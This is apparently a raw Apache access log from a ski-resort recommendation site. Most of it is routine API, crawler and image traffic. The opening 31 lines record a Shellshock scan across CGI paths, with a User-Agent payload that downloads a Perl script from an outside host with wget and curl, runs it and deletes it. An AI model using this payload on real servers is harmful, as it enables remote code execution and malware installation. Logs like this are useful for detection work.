46.183.221.142 - - [17/Feb/2016:11:04:41 -0800] "GET HTTP/1.1 HTTP/1.1" 400 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:42 -0800] "GET / HTTP/1.1" 200 2578 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:42 -0800] "GET /cgi-bin/bash HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:42 -0800] "GET /cgi-bin/contact.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:43 -0800] "GET /cgi-bin/defaultwebpage.cgi HTTP/1.1" 404 478 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:43 -0800] "GET /cgi-bin/env.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:43 -0800] "GET /cgi-bin/fire.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:44 -0800] "GET /cgi-bin/forum.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:44 -0800] "GET /cgi-bin/hello.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:44 -0800] "GET /cgi-bin/index.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:45 -0800] "GET /cgi-bin/login.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:45 -0800] "GET /cgi-bin/main.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:46 -0800] "GET /cgi-bin/meme.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:46 -0800] "GET /cgi-bin/php HTTP/1.1" 404 468 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:46 -0800] "GET /cgi-bin/php4 HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:47 -0800] "GET /cgi-bin/php5 HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:47 -0800] "GET /cgi-bin/php5-cli HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:47 -0800] "GET /cgi-bin/recent.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:48 -0800] "GET /cgi-bin/sat-ir-web.pl HTTP/1.1" 404 475 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:48 -0800] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:48 -0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:49 -0800] "GET /cgi-bin/test.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:49 -0800] "GET /cgi-bin/test-cgi.pl HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:50 -0800] "GET /cgi-bin/test.sh HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:50 -0800] "GET /cgi-bin/tools/tools.pl HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:50 -0800] "GET /cgi-mod/index.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:51 -0800] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 478 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:51 -0800] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 476 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:51 -0800] "GET /cgi-sys/php5 HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:52 -0800] "GET /phppath/cgi_wrapper HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
46.183.221.142 - - [17/Feb/2016:11:04:52 -0800] "GET /phppath/php HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
127.0.0.1 - - [17/Feb/2016:11:04:53 -0800] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
75.101.111.34 - - [17/Feb/2016:11:20:21 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
123.125.71.25 - - [17/Feb/2016:11:29:45 -0800] "GET /robots.txt HTTP/1.1" 200 382 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.30 - - [17/Feb/2016:11:32:54 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [17/Feb/2016:11:33:45 -0800] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 1087 "-" "node-superagent/1.4.0"
180.76.15.31 - - [17/Feb/2016:11:33:45 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.227 - - [17/Feb/2016:11:36:26 -0800] "GET /lib/reccapi.php?resort=purgatory&date=2016-02-03 HTTP/1.1" 200 1040 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.220 - - [17/Feb/2016:11:36:28 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=purgatory&dateStart=2016-02-01 HTTP/1.1" 200 865 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [17/Feb/2016:11:36:28 -0800] "GET /lib/reccapi.php?fields=t&date=2016-02-03&coords=37.65%2C-107.84&size=7&sort=distance HTTP/1.1" 200 1374 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1041 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 937 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1127 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 917 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1012 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 963 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 983 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1005 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1150 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1074 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 1092 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:39:09 -0800] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 924 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1055 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 1082 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 999 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 954 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 929 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1103 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 963 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:08 -0800] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1069 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:09 -0800] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:09 -0800] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1089 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:19 -0800] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1000 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:19 -0800] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 972 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:29 -0800] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 988 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:29 -0800] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1007 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:39 -0800] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:39 -0800] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:49 -0800] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 967 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:49 -0800] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 960 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:59 -0800] "GET /lib/reccapi.php?resort=canyons HTTP/1.1" 200 948 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:40:59 -0800] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 986 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:09 -0800] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1112 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:09 -0800] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:19 -0800] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:19 -0800] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:29 -0800] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1101 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:29 -0800] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1132 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:39 -0800] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 959 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:39 -0800] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1034 "-" "node-superagent/1.4.0"
216.57.96.2 - - [17/Feb/2016:11:41:47 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
166.170.15.64 - - [17/Feb/2016:11:41:49 -0800] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 971 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:49 -0800] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 936 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:59 -0800] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1060 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:41:59 -0800] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 1033 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:09 -0800] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:09 -0800] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1042 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:19 -0800] "GET /lib/reccapi.php?resort=grandtarghee HTTP/1.1" 200 1007 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:19 -0800] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1094 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:29 -0800] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1065 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:29 -0800] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 1087 "-" "node-superagent/1.4.0"
107.77.92.111 - - [17/Feb/2016:11:42:38 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
166.170.15.64 - - [17/Feb/2016:11:42:39 -0800] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 942 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:39 -0800] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1086 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:49 -0800] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 955 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:42:49 -0800] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 990 "-" "node-superagent/1.4.0"
166.170.15.64 - - [17/Feb/2016:11:43:00 -0800] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:47:15 -0800] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
66.249.79.234 - - [17/Feb/2016:11:47:44 -0800] "GET /lib/reccapi.php?resort=brianhead&date=2016-02-15 HTTP/1.1" 200 1059 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [17/Feb/2016:11:47:46 -0800] "GET /lib/reccapi.php?fields=t&date=2016-02-15&coords=37.67%2C-112.83&size=7&sort=distance HTTP/1.1" 200 1324 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [17/Feb/2016:11:47:47 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=brianhead&dateStart=2016-02-13 HTTP/1.1" 200 850 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
72.47.174.112 - - [17/Feb/2016:11:49:11 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2"
52.33.40.213 - - [17/Feb/2016:11:50:55 -0800] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 923 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:52:16 -0800] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 955 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:52:16 -0800] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1007 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:52:16 -0800] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:52:46 -0800] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1074 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:53:26 -0800] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 967 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:53:26 -0800] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 924 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:53:46 -0800] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 917 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:53:46 -0800] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:53:46 -0800] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 995 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:54:26 -0800] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 986 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:54:26 -0800] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1127 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:54:56 -0800] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 1005 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:11:54:56 -0800] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 937 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:11:57:47 -0800] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1086 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:11:57:47 -0800] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:11:57:47 -0800] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 959 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:11:57:48 -0800] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 990 "-" "node-superagent/1.4.0"
70.211.71.57 - - [17/Feb/2016:12:00:51 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4"
